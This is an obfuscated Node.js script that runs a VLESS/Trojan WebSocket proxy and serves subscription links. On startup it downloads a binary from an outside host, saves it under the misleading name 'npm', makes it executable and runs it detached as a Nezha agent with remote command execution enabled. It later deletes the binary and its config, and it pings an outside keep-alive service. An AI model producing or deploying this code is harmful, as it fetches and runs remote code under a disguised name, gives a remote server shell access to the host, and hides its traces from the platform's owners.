const _0x3f253d=_0x58b2;(function(_0x10f9cc,_0x32b34e){const _0x1b3d2c=_0x58b2,_0x1acc5f=_0x10f9cc();while(!![]){try{const _0x310f8d=-parseInt(_0x1b3d2c(0x133))/0x1*(-parseInt(_0x1b3d2c(0x154))/0x2)+-parseInt(_0x1b3d2c(0x129))/0x3+-parseInt(_0x1b3d2c(0xf7))/0x4*(parseInt(_0x1b3d2c(0x12d))/0x5)+-parseInt(_0x1b3d2c(0x10d))/0x6*(-parseInt(_0x1b3d2c(0xf8))/0x7)+-parseInt(_0x1b3d2c(0x136))/0x8*(-parseInt(_0x1b3d2c(0xee))/0x9)+parseInt(_0x1b3d2c(0x116))/0xa+parseInt(_0x1b3d2c(0x160))/0xb*(-parseInt(_0x1b3d2c(0xf2))/0xc);if(_0x310f8d===_0x32b34e)break;else _0x1acc5f['push'](_0x1acc5f['shift']());}catch(_0x441393){_0x1acc5f['push'](_0x1acc5f['shift']());}}}(_0x1c40,0xa2ca7));function _0x58b2(_0x803992,_0x4a821f){_0x803992=_0x803992-0xe8;const _0x1c40ff=_0x1c40();let _0x58b254=_0x1c40ff[_0x803992];return _0x58b254;}const os=require('os'),http=require(_0x3f253d(0x109)),fs=require('fs'),axios=require(_0x3f253d(0x15e)),net=require(_0x3f253d(0x163)),path=require('path'),crypto=require('crypto'),{Buffer}=require(_0x3f253d(0xe8)),{exec,execSync}=require(_0x3f253d(0x14b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3f253d(0x10b)][_0x3f253d(0x11e)]||_0x3f253d(0x15f),NEZHA_SERVER=process['env'][_0x3f253d(0x131)]||'',NEZHA_PORT=process[_0x3f253d(0x10b)][_0x3f253d(0xfe)]||'',NEZHA_KEY=process['env'][_0x3f253d(0x15d)]||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x3f253d(0x10b)][_0x3f253d(0x151)]||!![],WSPATH=process[_0x3f253d(0x10b)][_0x3f253d(0x148)]||UUID[_0x3f253d(0x106)](0x0,0x8),SUB_PATH=process['env'][_0x3f253d(0x124)]||'gs',NAME=process[_0x3f253d(0x10b)][_0x3f253d(0x108)]||'',PORT=process[_0x3f253d(0x10b)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x397c2e=_0x3f253d;try{const _0x26307f=await axios[_0x397c2e(0x14c)](_0x397c2e(0x104)),_0x21244c=_0x26307f[_0x397c2e(0x105)];ISP=(_0x21244c[_0x397c2e(0x141)]+'-'+_0x21244c[_0x397c2e(0x111)])[_0x397c2e(0xf6)](/ /g,'_');}catch(_0x521033){ISP=_0x397c2e(0x13c);}};function _0x1c40(){const _0x46e711=['includes','258990FrWZlD','error','createWriteStream','2087','npm\x20download\x20successfully','npm','connection','false','pop','NEZHA_KEY','axios','ccdebda2-091f-4389-9a95-ef98be0dea10','187vDWPvN','&path=%2F','digest','net','buffer','then','setsid\x20nohup\x20./npm\x20-s\x20','client_secret:\x20','catch','length','390483maVKrZ','write','hex','https://oooo.serv00.net/add-url','368484TpegGR','createServer','utf-8','https://amd64.ssss.nyc.mn/v1','replace','4XEhQdO','4137fkUmMy','listen','&fp=chrome&type=ws&host=','toString','unlink','vless://','NEZHA_PORT','readUInt8','log','index.html','concat','arm','https://api.ip.sb/geoip','data','slice','test','NAME','http','https://amd64.ssss.nyc.mn/agent','env','--tls','4782tOEjQX',':443?encryption=none&security=tls&sni=','message','Answer','isp','substr','readUInt16BE','https://dns.google/resolve?name=','writeFileSync','6910540KYFXMQ','pipe','connect','Hello\x20world!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','from','every','arm64','UUID','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/bin/bash','text/plain','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','trim','SUB_PATH','once','end','url','application/json','1634019aptcrD','text/html','Not\x20Found\x0a','npm\x20is\x20already\x20running,\x20skip\x20running...','3420785oWzkAe','createHash','sha224','utf8','NEZHA_SERVER','config.yaml','4sdakaZ','reduce',':443?security=tls&sni=','136jfbPsk','send','application/dns-json','Failed\x20to\x20resolve\x20','true','post','Unknown','join','close','\x20with\x20all\x20DNS\x20servers','Server','country_code','Status','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','map','2083','\x20-p\x20','WSPATH','finish','trojan://','child_process','get','update','8443','Automatic\x20Access\x20Task\x20added\x20successfully','writeHead','AUTO_ACCESS','chmod\x20+x\x20npm'];_0x1c40=function(){return _0x46e711;};return _0x1c40();}GetISP();const httpServer=http[_0x3f253d(0xf3)]((_0x4fd830,_0x1b64c3)=>{const _0x128e7a=_0x3f253d;if(_0x4fd830[_0x128e7a(0x127)]==='/'){const _0x10b607=path['join'](__dirname,_0x128e7a(0x101));fs['readFile'](_0x10b607,_0x128e7a(0x130),(_0x48e29a,_0x4be9fe)=>{const _0x5c3186=_0x128e7a;if(_0x48e29a){_0x1b64c3['writeHead'](0xc8,{'Content-Type':_0x5c3186(0x12a)}),_0x1b64c3[_0x5c3186(0x126)](_0x5c3186(0x119));return;}_0x1b64c3[_0x5c3186(0x150)](0xc8,{'Content-Type':_0x5c3186(0x12a)}),_0x1b64c3[_0x5c3186(0x126)](_0x4be9fe);});return;}else{if(_0x4fd830[_0x128e7a(0x127)]==='/'+SUB_PATH){const _0x7fb37d=NAME?NAME+'-'+ISP:ISP,_0x4c014a=_0x128e7a(0xfd)+UUID+'@'+DOMAIN+_0x128e7a(0x10e)+DOMAIN+_0x128e7a(0xfa)+DOMAIN+_0x128e7a(0x161)+WSPATH+'#'+_0x7fb37d,_0x421acb=_0x128e7a(0x14a)+UUID+'@'+DOMAIN+_0x128e7a(0x135)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x128e7a(0x161)+WSPATH+'#'+_0x7fb37d,_0x3331d1=_0x4c014a+'\x0a'+_0x421acb,_0xd38d15=Buffer[_0x128e7a(0x11b)](_0x3331d1)[_0x128e7a(0xfb)]('base64');_0x1b64c3[_0x128e7a(0x150)](0xc8,{'Content-Type':_0x128e7a(0x121)}),_0x1b64c3[_0x128e7a(0x126)](_0xd38d15+'\x0a');}else _0x1b64c3['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x1b64c3[_0x128e7a(0x126)](_0x128e7a(0x12b));}}),wss=new WebSocket[(_0x3f253d(0x140))]({'server':httpServer}),uuid=UUID[_0x3f253d(0xf6)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x8e3aae){return new Promise((_0x5857bd,_0x1f1291)=>{const _0x4871e0=_0x58b2;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4871e0(0x107)](_0x8e3aae)){_0x5857bd(_0x8e3aae);return;}let _0xe5654d=0x0;function _0x229a68(){const _0x17bf8b=_0x4871e0;if(_0xe5654d>=DNS_SERVERS[_0x17bf8b(0xed)]){_0x1f1291(new Error(_0x17bf8b(0x139)+_0x8e3aae+_0x17bf8b(0x13f)));return;}const _0x243030=DNS_SERVERS[_0xe5654d];_0xe5654d++;const _0x38305b=_0x17bf8b(0x114)+encodeURIComponent(_0x8e3aae)+'&type=A';axios[_0x17bf8b(0x14c)](_0x38305b,{'timeout':0x1388,'headers':{'Accept':_0x17bf8b(0x138)}})['then'](_0x39cbdb=>{const _0x3d5727=_0x17bf8b,_0x4bf151=_0x39cbdb[_0x3d5727(0x105)];if(_0x4bf151[_0x3d5727(0x142)]===0x0&&_0x4bf151[_0x3d5727(0x110)]&&_0x4bf151['Answer'][_0x3d5727(0xed)]>0x0){const _0x5c9583=_0x4bf151['Answer']['find'](_0x2f4a44=>_0x2f4a44['type']===0x1);if(_0x5c9583){_0x5857bd(_0x5c9583[_0x3d5727(0x105)]);return;}}_0x229a68();})[_0x17bf8b(0xec)](_0x388887=>{_0x229a68();});}_0x229a68();});}function handleVlessConnection(_0x49bef1,_0x5ebde2){const _0x250ee4=_0x3f253d,[_0xf244c]=_0x5ebde2,_0x2ba74d=_0x5ebde2[_0x250ee4(0x106)](0x1,0x11);if(!_0x2ba74d['every']((_0x31aeee,_0x42bdaf)=>_0x31aeee==parseInt(uuid[_0x250ee4(0x112)](_0x42bdaf*0x2,0x2),0x10)))return![];let _0x1e597c=_0x5ebde2[_0x250ee4(0x106)](0x11,0x12)['readUInt8']()+0x13;const _0x7ddd4a=_0x5ebde2['slice'](_0x1e597c,_0x1e597c+=0x2)[_0x250ee4(0x113)](0x0),_0x52a269=_0x5ebde2[_0x250ee4(0x106)](_0x1e597c,_0x1e597c+=0x1)[_0x250ee4(0xff)](),_0x51c4d4=_0x52a269==0x1?_0x5ebde2[_0x250ee4(0x106)](_0x1e597c,_0x1e597c+=0x4)[_0x250ee4(0x13d)]('.'):_0x52a269==0x2?new TextDecoder()['decode'](_0x5ebde2[_0x250ee4(0x106)](_0x1e597c+0x1,_0x1e597c+=0x1+_0x5ebde2[_0x250ee4(0x106)](_0x1e597c,_0x1e597c+0x1)['readUInt8']())):_0x52a269==0x3?_0x5ebde2[_0x250ee4(0x106)](_0x1e597c,_0x1e597c+=0x10)[_0x250ee4(0x134)]((_0x27cbc6,_0x2d7281,_0x1d3116,_0x2eecd0)=>_0x1d3116%0x2?_0x27cbc6[_0x250ee4(0x102)](_0x2eecd0[_0x250ee4(0x106)](_0x1d3116-0x1,_0x1d3116+0x1)):_0x27cbc6,[])[_0x250ee4(0x145)](_0x3946da=>_0x3946da[_0x250ee4(0x113)](0x0)[_0x250ee4(0xfb)](0x10))[_0x250ee4(0x13d)](':'):'';_0x49bef1[_0x250ee4(0x137)](new Uint8Array([_0xf244c,0x0]));const _0x5b951=createWebSocketStream(_0x49bef1);return resolveHost(_0x51c4d4)['then'](_0x55731a=>{const _0x156f5a=_0x250ee4;net[_0x156f5a(0x118)]({'host':_0x55731a,'port':_0x7ddd4a},function(){const _0xd56d47=_0x156f5a;this['write'](_0x5ebde2[_0xd56d47(0x106)](_0x1e597c)),_0x5b951['on'](_0xd56d47(0x155),()=>{})['pipe'](this)['on'](_0xd56d47(0x155),()=>{})['pipe'](_0x5b951);})['on']('error',()=>{});})[_0x250ee4(0xec)](_0x58ca9f=>{const _0x40dd8d=_0x250ee4;net[_0x40dd8d(0x118)]({'host':_0x51c4d4,'port':_0x7ddd4a},function(){const _0x7445e4=_0x40dd8d;this[_0x7445e4(0xef)](_0x5ebde2[_0x7445e4(0x106)](_0x1e597c)),_0x5b951['on'](_0x7445e4(0x155),()=>{})[_0x7445e4(0x117)](this)['on'](_0x7445e4(0x155),()=>{})['pipe'](_0x5b951);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x5376b9,_0x3ae2ca){const _0x56f66f=_0x3f253d;try{if(_0x3ae2ca[_0x56f66f(0xed)]<0x3a)return![];const _0x3a3c80=_0x3ae2ca['slice'](0x0,0x38)['toString'](),_0x4a0b8d=[UUID];let _0x3d0318=null;for(const _0x256bed of _0x4a0b8d){const _0xb6a1d3=crypto[_0x56f66f(0x12e)](_0x56f66f(0x12f))[_0x56f66f(0x14d)](_0x256bed)[_0x56f66f(0x162)](_0x56f66f(0xf0));if(_0xb6a1d3===_0x3a3c80){_0x3d0318=_0x256bed;break;}}if(!_0x3d0318)return![];let _0x46322c=0x38;_0x3ae2ca[_0x46322c]===0xd&&_0x3ae2ca[_0x46322c+0x1]===0xa&&(_0x46322c+=0x2);const _0x412fca=_0x3ae2ca[_0x46322c];if(_0x412fca!==0x1)return![];_0x46322c+=0x1;const _0x436765=_0x3ae2ca[_0x46322c];_0x46322c+=0x1;let _0x468c11,_0x51d826;if(_0x436765===0x1)_0x468c11=_0x3ae2ca[_0x56f66f(0x106)](_0x46322c,_0x46322c+0x4)[_0x56f66f(0x13d)]('.'),_0x46322c+=0x4;else{if(_0x436765===0x3){const _0x199979=_0x3ae2ca[_0x46322c];_0x46322c+=0x1,_0x468c11=_0x3ae2ca[_0x56f66f(0x106)](_0x46322c,_0x46322c+_0x199979)[_0x56f66f(0xfb)](),_0x46322c+=_0x199979;}else{if(_0x436765===0x4)_0x468c11=_0x3ae2ca[_0x56f66f(0x106)](_0x46322c,_0x46322c+0x10)['reduce']((_0x262b79,_0xee004,_0x596c34,_0x230f8d)=>_0x596c34%0x2?_0x262b79['concat'](_0x230f8d[_0x56f66f(0x106)](_0x596c34-0x1,_0x596c34+0x1)):_0x262b79,[])['map'](_0x5377c7=>_0x5377c7['readUInt16BE'](0x0)[_0x56f66f(0xfb)](0x10))[_0x56f66f(0x13d)](':'),_0x46322c+=0x10;else return![];}}_0x51d826=_0x3ae2ca[_0x56f66f(0x113)](_0x46322c),_0x46322c+=0x2;_0x46322c<_0x3ae2ca[_0x56f66f(0xed)]&&_0x3ae2ca[_0x46322c]===0xd&&_0x3ae2ca[_0x46322c+0x1]===0xa&&(_0x46322c+=0x2);const _0x1a636f=createWebSocketStream(_0x5376b9);return resolveHost(_0x468c11)[_0x56f66f(0xe9)](_0x80bf56=>{const _0x15b4e0=_0x56f66f;net[_0x15b4e0(0x118)]({'host':_0x80bf56,'port':_0x51d826},function(){const _0x449519=_0x15b4e0;_0x46322c<_0x3ae2ca[_0x449519(0xed)]&&this[_0x449519(0xef)](_0x3ae2ca[_0x449519(0x106)](_0x46322c)),_0x1a636f['on'](_0x449519(0x155),()=>{})[_0x449519(0x117)](this)['on'](_0x449519(0x155),()=>{})[_0x449519(0x117)](_0x1a636f);})['on'](_0x15b4e0(0x155),()=>{});})[_0x56f66f(0xec)](_0x47efa1=>{const _0x1226bb=_0x56f66f;net[_0x1226bb(0x118)]({'host':_0x468c11,'port':_0x51d826},function(){const _0xc2ba62=_0x1226bb;_0x46322c<_0x3ae2ca[_0xc2ba62(0xed)]&&this['write'](_0x3ae2ca[_0xc2ba62(0x106)](_0x46322c)),_0x1a636f['on']('error',()=>{})[_0xc2ba62(0x117)](this)['on'](_0xc2ba62(0x155),()=>{})[_0xc2ba62(0x117)](_0x1a636f);})['on'](_0x1226bb(0x155),()=>{});}),!![];}catch(_0x410f12){return![];}}wss['on'](_0x3f253d(0x15a),(_0x2628a6,_0x340460)=>{const _0x5d8b79=_0x3f253d,_0x2d7855=_0x340460[_0x5d8b79(0x127)]||'';_0x2628a6[_0x5d8b79(0x125)](_0x5d8b79(0x10f),_0x1eed4c=>{const _0xdcd24d=_0x5d8b79;if(_0x1eed4c[_0xdcd24d(0xed)]>0x11&&_0x1eed4c[0x0]===0x0){const _0x16c322=_0x1eed4c['slice'](0x1,0x11),_0x551ac0=_0x16c322[_0xdcd24d(0x11c)]((_0x4e84bd,_0x525669)=>_0x4e84bd==parseInt(uuid[_0xdcd24d(0x112)](_0x525669*0x2,0x2),0x10));if(_0x551ac0){!handleVlessConnection(_0x2628a6,_0x1eed4c)&&_0x2628a6['close']();return;}}!handleTrojanConnection(_0x2628a6,_0x1eed4c)&&_0x2628a6[_0xdcd24d(0x13e)]();})['on'](_0x5d8b79(0x155),()=>{});});const getDownloadUrl=()=>{const _0x53ec61=_0x3f253d,_0x151904=os['arch']();return _0x151904===_0x53ec61(0x103)||_0x151904===_0x53ec61(0x11d)||_0x151904==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x53ec61(0xf5):_0x53ec61(0x10a);},downloadFile=async()=>{const _0x4ac3b7=_0x3f253d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x510b42=getDownloadUrl(),_0x3656bb=await axios({'method':_0x4ac3b7(0x14c),'url':_0x510b42,'responseType':'stream'}),_0x2a155b=fs[_0x4ac3b7(0x156)](_0x4ac3b7(0x159));return _0x3656bb[_0x4ac3b7(0x105)]['pipe'](_0x2a155b),new Promise((_0x3639be,_0x2142e6)=>{const _0x179d75=_0x4ac3b7;_0x2a155b['on'](_0x179d75(0x149),()=>{const _0x1115d3=_0x179d75;console['log'](_0x1115d3(0x158)),exec(_0x1115d3(0x152),_0x3a3776=>{if(_0x3a3776)_0x2142e6(_0x3a3776);_0x3639be();});}),_0x2a155b['on']('error',_0x2142e6);});}catch(_0x463cd4){throw _0x463cd4;}},runnz=async()=>{const _0x348c40=_0x3f253d;try{const _0xb1ec88=execSync(_0x348c40(0x143),{'encoding':_0x348c40(0xf4)});if(_0xb1ec88[_0x348c40(0x123)]()!==''){console['log'](_0x348c40(0x12c));return;}}catch(_0x989d7f){}await downloadFile();let _0x1ec2a9='',_0x595d7b=['443',_0x348c40(0x14e),'2096',_0x348c40(0x157),_0x348c40(0x146),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5ba0f3=_0x595d7b[_0x348c40(0x153)](NEZHA_PORT)?_0x348c40(0x10c):'';_0x1ec2a9=_0x348c40(0xea)+NEZHA_SERVER+':'+NEZHA_PORT+_0x348c40(0x147)+NEZHA_KEY+'\x20'+_0x5ba0f3+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3635fd=NEZHA_SERVER[_0x348c40(0x153)](':')?NEZHA_SERVER['split'](':')[_0x348c40(0x15c)]():'',_0x2cd4ab=_0x595d7b['includes'](_0x3635fd)?_0x348c40(0x13a):_0x348c40(0x15b),_0x51bf07=_0x348c40(0xeb)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x348c40(0x11a)+_0x2cd4ab+_0x348c40(0x11f)+UUID;fs[_0x348c40(0x115)](_0x348c40(0x132),_0x51bf07);}_0x1ec2a9=_0x348c40(0x122);}else{console[_0x348c40(0x100)](_0x348c40(0x144));return;}}try{exec(_0x1ec2a9,{'shell':_0x348c40(0x120)},_0x149887=>{const _0x582bcf=_0x348c40;if(_0x149887)console[_0x582bcf(0x155)]('npm\x20running\x20error:',_0x149887);else console['log']('npm\x20is\x20running');});}catch(_0x439cd7){console[_0x348c40(0x155)]('error:\x20'+_0x439cd7);}};async function addAccessTask(){const _0x395948=_0x3f253d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x22e2f2='https://'+DOMAIN;try{const _0x163246=await axios[_0x395948(0x13b)](_0x395948(0xf1),{'url':_0x22e2f2},{'headers':{'Content-Type':_0x395948(0x128)}});console['log'](_0x395948(0x14f));}catch(_0x246049){}}const delFiles=()=>{const _0x4f9f36=_0x3f253d;fs[_0x4f9f36(0xfc)](_0x4f9f36(0x159),()=>{}),fs[_0x4f9f36(0xfc)](_0x4f9f36(0x132),()=>{});};httpServer[_0x3f253d(0xf9)](PORT,()=>{const _0x141658=_0x3f253d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x141658(0x100)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
